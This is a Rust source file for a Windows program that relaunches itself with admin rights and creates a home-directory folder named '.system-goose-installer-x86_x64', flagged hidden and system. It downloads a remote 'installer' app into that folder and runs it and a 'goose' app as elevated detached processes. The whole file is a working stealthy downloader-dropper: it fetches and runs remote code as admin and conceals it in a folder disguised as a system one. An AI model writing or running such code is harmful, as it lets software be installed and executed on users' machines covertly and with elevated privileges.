use std::env::current_exe;
use std::fs;
use std::path::*;

use apps_info::*;
use windows::core::*;
use windows::Win32::Storage::FileSystem::*;
use windows::Win32::UI::Shell::IsUserAnAdmin;

fn main() {
    // Elevate Process
    if unsafe { !IsUserAnAdmin().as_bool() } {
        start_detached_admin_process(&current_exe().unwrap()).unwrap();
        return;
    }

    let mut dst_folder = dirs::home_dir().unwrap();
    dst_folder.push(".system-goose-installer-x86_x64");

    let fetched = FetchedApps::fetch().unwrap();
    let exe_path = fetched.app_folder("installer", &dst_folder).join(
        fetched.apps_info_ref().apps["installer"]
            .run_after_update
            .as_ref()
            .unwrap(),
    );

    if dst_folder.exists() {
        // Execute goose (if already installed)
        {
            let app_info = LocalAppInfo::new(dst_folder.clone()).unwrap();
            if let Some(folder) = app_info.app_folder("goose") {
                if let Some(exe_name) = &app_info.apps_info_ref().apps["goose"].run_after_update {
                    let _ = start_detached_admin_process(&folder.join(exe_name));
                }
            }
        }

        if !exe_path.exists() {
            hide_dir(&dst_folder);
            download_installer(dst_folder, &fetched);
        }
    } else {
        fs::create_dir(&dst_folder).unwrap();
        hide_dir(&dst_folder);

        download_installer(dst_folder, &fetched);
    }

    // Execute installer
    start_detached_admin_process(&exe_path).unwrap();
}

fn hide_dir(dir: &Path) {
    unsafe {
        let mut dir_str = dir.to_str().unwrap().to_string();
        dir_str.push('\0');
        let ansii_home = PCSTR(dir_str.as_ptr());

        let mut flags = FILE_FLAGS_AND_ATTRIBUTES(GetFileAttributesA(ansii_home));
        flags.0 |= FILE_ATTRIBUTE_HIDDEN.0;
        flags.0 |= FILE_ATTRIBUTE_SYSTEM.0;
        SetFileAttributesA(ansii_home, flags).unwrap();
    }
}

fn download_installer(dst_folder: PathBuf, fetched: &FetchedApps) {
    let mut app_info = LocalAppInfo::new(dst_folder).unwrap();
    fetched.download_app(&mut app_info, "installer").unwrap();
}
